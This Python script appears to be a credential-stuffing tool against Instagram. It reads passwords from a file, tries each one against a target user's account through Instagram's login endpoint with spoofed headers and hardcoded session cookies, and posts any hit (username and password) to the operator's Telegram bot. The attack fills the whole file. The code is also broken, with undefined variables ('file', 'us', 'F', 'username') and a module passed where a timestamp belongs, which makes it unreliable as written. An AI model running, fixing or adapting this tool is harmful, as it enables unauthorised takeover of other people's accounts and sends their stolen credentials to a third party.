#---------------[ imports ]------------------#
import requests,time,pyfiglet,random,time,webbrowser
from user_agent import generate_user_agent
webbrowser.open('https://t.me/uiujq')

a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[39;5;396m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح

print(f"""\033[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⢿⠿⠿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣻⣉⡫⠒⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⣐⡫⡑⢶⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⡿⣟⣜⣶⣨⡰⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⣊⠵⣿⣲⢺⡽⣄⡔⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣻⡽⢶⣚⣵⢔⠬⠙⢶⣤⣄⡠⢀⣀⡀⡀⣀⡠⢄⠤⢦⠲⢦⣀⢀⣄⠀⡀⢀⠀⢀⣄⣤⡶⣛⡶⢞⣬⣿⡭⢟⣗⡶⣢⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣾⣟⡏⣭⣯⣭⣚⣐⢙⢻⣿⣷⡍⠀⣿⡱⢠⣟⢮⣺⡵⢎⡩⠃⡴⡟⢰⢌⢞⣫⡿⣋⢖⢭⣰⡩⡕⣫⠝⣾⣞⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣞⡕⠶⢴⣾⣷⣽⣯⡇⠹⠿⠌⠀⣵⣅⠺⢇⠺⣅⠒⣺⠅⢀⣿⠌⠀⠈⠢⠏⢼⣽⣿⣽⣽⣽⣷⢞⡿⣶⣽⣿⠃⠄⠘⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣾⣦⣼⣿⣿⡻⣉⢴⡂⠀⡄⢠⣩⡏⠰⣈⠖⣌⡷⠡⠐⢸⡇⠀⠀⠀⠀⠀⠽⠻⣛⡭⠼⢶⢭⣿⢾⣿⡿⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣟⢿⣿⣿⡏⡧⢦⣄⣙⢬⡷⠚⡈⢺⣿⣤⠓⠬⣽⢸⡿⠠⢴⡀⡜⡀⠀⠁⠁⢂⠐⢩⢠⣾⢻⣿⣿⣿⢿⢯⣽⠄⠠⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣯⣿⣿⣿⣿⣿⣿⣟⣧⢷⡤⢂⢥⢣⡿⣽⣶⣸⢿⣏⣾⣥⣿⡿⢓⠠⢂⠀⠁⠄⡈⢝⣷⢷⠟⡽⣽⢿⣅⠈⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⢨⠟⠙⣿⣿⣾⣿⣷⣿⣟⢧⡒⢯⢾⣿⡿⠙⣿⡵⣾⣿⠏⣼⡟⠀⠐⢠⠂⠀⠀⠀⠀⠐⠙⠚⣩⣔⣿⣿⣿⠃⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡸⡿⣿⢿⣟⣿⢋⡚⢣⠀⠀⢻⣿⡀⠸⣿⠴⣿⣿⠇⣿⡏⠉⢀⣂⢀⠈⠁⠀⠀⠀⠀⠀⢪⣵⣾⣛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠠⡑⢂⠣⣟⣺⡥⡋⠈⠭⣁⢤⣔⣻⠇⢠⡟⣃⠸⣿⢑⣸⡆⠀⣲⡗⡁⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⢹⡜⣧⠍⠶⣨⢭⣰⣶⣷⣾⣷⣾⣿⣷⣫⣬⡈⠒⣊⠡⣬⣧⠂⣠⣶⣷⣾⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠘⣿⣏⣾⣳⣷⡿⣿⣿⣿⣿⣿⣾⣿⡷⣿⣿⡀⡐⠀⠀⡸⠠⢠⣿⣿⣿⣯⣽⣿⣿⠷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⢿⣛⣏⣿⣿⣿⣿⣿⣿⣿⣿⠑⡿⠉⠁⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⡿⠃⢈⢻⢥⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⢯⣿⣾⣿⣿⣿⠿⠿⣛⣿⣇⡒⣤⢇⠜⠂⠀⢒⢠⣒⠙⠿⢿⣿⡿⠟⠀⣰⢺⠴⠘⠓⠢⠀⠀⠀⠀⢀⠀⠰⠄⠰⠐⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠘⣏⣭⣽⣿⣿⣿⡶⣭⢵⣾⣿⣿⣿⡿⡁⠀⠀⠛⢯⣽⣿⣆⡐⠀⠀⡉⢰⣿⢷⠃⠂⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠘⢁⠀⠀⠂⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣯⣿⣿⣯⡽⣿⣶⡯⠿⠉⠻⣿⣷⣵⢩⣓⣶⣯⠏⠀⢨⠅⣁⠻⣤⣜⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠐⢀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⢿⣹⣽⣩⠁⠀⠉⠀⠀⠉⠻⢿⣿⡿⠉⠁⠀⠀⠀⠉⠁⠉⠉⠀⠀⢶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⢀⠠⠀⠀
⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡷⡯⣛⣤⣶⡦⣠⠐⡐⣼⣴⣫⣽⣿⣿⡵⡐⡢⠀⠀⠀⠀⠀⢤⣒⠶⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠁⠀
⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣷⣿⣷⣷⣧⣞⣵⢾⣐⠮⣟⠻⣛⠻⠟⡿⢿⠇⠀⡀⢠⢀⡐⢋⢍⠀⠠⠢⠄⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⡿⣿⣿⣿⣿⣿⣾⣿⣯⣽⣢⣍⣠⠃⢂⣁⣢⣜⡞⣷⣆⣣⣰⣴⠲⣅⠀⠄⠤⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣾⣿⣿⠿⡿⠃⠙⡷⡤⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢀⠀⡈⠰⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⣽⣿⣏⡶⣯⡿⢿⣿⣿⣿⣿⣿⣿⢿⢟⡛⠿⡏⢙⠻⣁⡐⢴⡞⠯⠘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠘⢠⠉⠄⠀
⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⣽⣻⠿⣟⣷⡿⣛⡿⣜⢣⡿⣻⢽⠿⣫⠏⠜⡺⠔⠐⠙⠡⠳⠘⠋⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠀⠈⠀⠀
⢰⠀⠀⠀⠈⠂⡄⠀⠀⡀⠀⠀⢸⣿⣽⣟⣯⡽⢿⡛⢶⣹⡾⣵⢧⠞⠔⠰⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⠠⠅⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢱⡀⠀⠀⠀⠂⠀⠁⠀⠀⠀⠀⣽⣿⣿⣿⣿⣛⡲⢍⢶⢭⣿⡽⡵⢤⠀⠜⢁⠀⠈⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⡀⢀⢐⠏⠀⠈⠀⡀⠀⠀⠀⠀⠂⠀⠐⠀⠀⠀⠀
⢬⡃⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣯⠿⣟⣿⣿⣿⡶⢟⣵⣽⢞⠄⢀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣞⠿⣽⡽⠟⠞⠀⠀⡀⣤⡄⠆⠂⢀⠂⠄⠄⠀⠀⠀⠘⢀⠀
⢨⢧⠀⠀⠄⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠻⣌⠀⣁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠏⢘⠃⠂⢑⢠⣄⡢⠉⠁⠀⠈⠁⠆⡄⠈⢠⠀⠀⠀⠈⠀⠀
⢎⡻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡭⣿⣿⣿⣿⣿⣿⣿⣮⢧⣛⢌⡽⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⣷⣼⣾⣟⠷⠬⢀⡀⠀⠀⠀⠀⠈⢌⠠⠁⠌⠘⢤⠀⠁⠀
⢞⡽⣟⠐⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⢟⠓⣻⣟⣿⣿⣿⣿⣿⣫⢎⣼⢂⡀⣷⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠟⡁⣍⠀⠀⠀⠀⠁⠀⠀⠀⠀⠄⠀⠀⠠⠀⠀⠈⡈⠨⠀
⢸⣣⢿⠀⠀⢀⡰⡂⠀⡀⠀⠀⠀⢙⣷⣫⣕⣟⣯⣿⣿⣿⣿⣯⢻⡛⣎⡥⣎⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣌⠢⡁⠃⠑⠀⠀⠀⠀⠀⠄⠀⠄⠀⠠⠠⡀⠀⠠⢌⠀⠄⠄
⢨⡳⣞⣯⠄⣫⠢⢎⢦⢨⠀⢁⠀⢠⡿⠟⠛⡻⡾⣿⣿⣿⣿⣎⢳⢽⢹⢸⢃⡞⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠃⠐⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠠⠀⡔⠜⢰⢣⢁⠌⡈⠜⡀
⣸⢳⣽⣻⣼⣾⣵⣾⣹⣶⣏⣜⡦⢩⣔⡲⢷⡴⡟⣯⣿⣿⣿⣽⣿⡞⡾⣞⣸⢬⣇⠃⠀⠀⠀⠀⠀⠀⣸⣇⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡣⠕⠈⠐⢁⠀⠌⠞⠘⣲⢀⠀
⢾⣻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣯⡭⠿⢷⣷⢿⡳⢏⣿⣿⣿⣿⣻⡛⣯⢺⣼⢸⢷⢸⣰⠇⠀⠀⠀⢐⣻⣧⢧⢚⡼⡀⠀⠀⠀⠀⠀⠀⠀⠐⠐⡀⢣⠀⢀⡐⠠⡀⠂⠁⠁
⣿⣿⣿⣿⢿⣿⡾⣿⢿⣯⣿⣿⣯⠏⡹⠩⠂⠈⢰⠾⠶⣿⣿⣿⢿⣱⣿⢾⢻⢻⣼⠀⣏⠀⠀⠀⣣⡉⣿⣿⡄⡊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠨⡂⢑⠊⠊⡌⠆⠀
⣽⣿⣿⣿⣿⣾⣿⣽⢷⣟⣿⣿⣿⢿⡈⠎⣖⣮⠯⠂⠀⣼⣿⣿⣝⣿⣿⢿⢾⣿⣿⣷⣿⡇⢇⡇⣷⣷⣿⣧⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠠⠐⠐⢐⢰⠁⠀
⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣚⣤⣠⢵⣾⣿⣿⠿⣾⢣⣿⣎⢷⣻⣌⢼⣫⠇⡸⣣⡼⣿⣿⣟⣮⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠚⠎⠈⠈⡂⡐⠀
⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣏⢧⡛⢬⣷⣿⣿⣿⣿⡾⣿⡟⣮⣷⣻⣷⢿⣿⡿⣿⡛⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠈⠸⠀⣱⠄⠃⠂
⢿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⡘⣏⠜⣫⢿⢿⣞⡿⢳⢿⣟⣿⢿⣋⠯⣗⠗⠃⠈⠀⠀⡠⠀⠀⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠣⠄⡙⠔⠀
⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⣿⢾⣸⣄⣋⡘⢚⢧⢞⣭⢄⣚⣾⡇⣗⠇⠀⠀⠀⠈⠂⠀⠀⠀⠈⠀⠀⠀⠀⠀⠠⠀⠠⠀⠀⠀⠀⠜⠈⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣟⣿⣻⣿⣾⣿⣾⣷⣾⡌⣰⢞⣺⣏⠅⢆⡉⡀⠡⡠⠀⠀⠁⠀⠀⠀⠄⠁⠀⠀⠀⠀⠀⠀⡀⠀⠠⠠⠀⢄⠈⠂⠀
⣼⢿⣿⠚⣿⣿⣽⢿⣿⢿⣿⣿⣿⣿⣷⣿⣟⣿⣿⣻⡾⣷⣻⣿⣿⣿⣿⣿⣿⣧⣿⣾⣿⣾⡇⣾⡿⡳⡍⠊⡰⡀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠁⠪⠀⢀⢠⠰⢀⠨⠀
⠈⠊⢞⠋⠌⠛⠈⡙⢎⠛⢿⡯⣿⢿⣿⣿⣿⣿⣷⠿⣙⣷⣻⣿⢏⣯⢿⣿⣿⣿⡛⠟⠹⠟⠁⠀⠁⠐⠘⠋⠀⠀⠀⠤⢀⢐⠀⠀⠀⠁⠀⠀⠀⠀⠀⠙⡠⢌⠁⠀⠀⠎⠀
⠀⠁⠀⠣⠀⠀⠀⠀⠀⡂⠀⠣⠇⢉⡋⠇⠇⠛⢿⣦⡽⠉⠁⠊⠁⠘⠉⠙⣿⡟⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡀⠀⠀⠀⠡⠢⠈⡀
⠀⠀⢀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠐⠀⠁⠁⡀⠀⢀⠙⠿⠂⠘⠛⢂⠄⠂⠂⢝⢿⣆⠉⠢⠀⠀⠀⡀⠀⠀⢐⠀⠄⢀⠀⠀⠀⠀⠀⠂⠂⢠⠀⠀⠀⠀⢀⠂⠀⠀⡀⠘⠰⡀
⠀⠀⠀⠁⠀⠄⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⠠⠀⠰⠠⠀⠀⠀⠁⠀⢀⠀⠐⠙⠟⢷⢦⢀⠀⠀⠠⠐⢀⠨⠐⠘⠐⠁⠀⠀⠀⠘⠂⠁⠀⠀⠀⠀⠁⠀⢂⡀⢀⢋⠄⠂
⠀⠀⠀⠢⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠠⠀⠂⠊⠆⠂⠀⠀⠂⠀⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀ """)

ID=input('\x1b[38;5;13m☬ ID ' + a4)
token=input('\x1b[1;32m☬ Token ' + a5)
r = requests.Session()

rfile = input('\x1b[38;5;180m File Name :  ' + a14)
rfile = open(file, 'r')

aa = input('\x1b[38;5;180m Target User ' + a32)
while True:
	user = us
	password = rfile.readline().split('\n')[0]

	url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
	
	headers = {
'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '336',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=YPvYkQALAAH7ZlNgkXiBnW6y7AOy; ig_did=1C396C9B-7DC7-463E-A68B-FE991198F88A; ig_nrcb=1; shbid="944\0546317830362\0541658653745:01f7bf09c30c2bf6ae86e32af31b5991cd84a607e1547a0132f6b653c4b76ecc26abbc4e"; shbts="1627117745\0546317830362\0541658653745:01f716bcf5ca94c711aa8ee17e52cf927685a30c29c89e0310cfe9f86589901109fd5b1e"; rur="RVA\05448065200129\0541658659405:01f7d96b5f9c1cf2396b6d00cbc7281da4dc2bb4c75a035bf4917e188315d170aec60aa2"; csrftoken=mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(generate_user_agent()),
        'x-asbd-id': '437806',
        'x-csrftoken': 'mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
        'x-instagram-ajax': 'caee87137ae9',
        'x-requested-with': 'XMLHttpRequest'
    }
	
	
	data = (f'enc_password=#PWD_INSTAGRAM_BROWSER:0:{time}:{password}&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username={us}')
	
	response = requests.post(url,headers=headers,data=data)
	
	if 'userId' in response.text:
		print(F + 'user name -> '+user)
		print(F + 'password -> '+password)
		mdc = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • Hιт Iιиѕтαgям υѕєя \=======================
		
- User ➪ {username} 
- PAS ➪ {password} 

=======================
• PY : @M02MM / @uiujq ''')
		i = requests.post(mdc)
	
	else:
		print(a19+'Error: '+password)
		
